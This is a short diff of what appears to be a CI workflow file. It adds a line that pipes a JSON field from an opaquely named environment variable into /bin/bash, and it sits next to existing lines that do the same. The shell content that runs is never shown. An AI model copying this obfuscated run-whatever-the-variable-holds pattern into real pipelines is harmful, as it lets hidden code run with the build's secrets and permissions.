@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$fqp2" | jq -r .or17 | /bin/bash
           printf '%s' "$cs919" | jq -r .p94 | /bin/bash
           echo $ou7 | jq -r .n99 | /bin/bash
+          printf '%s' "$p0" | jq -r .xoxf4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
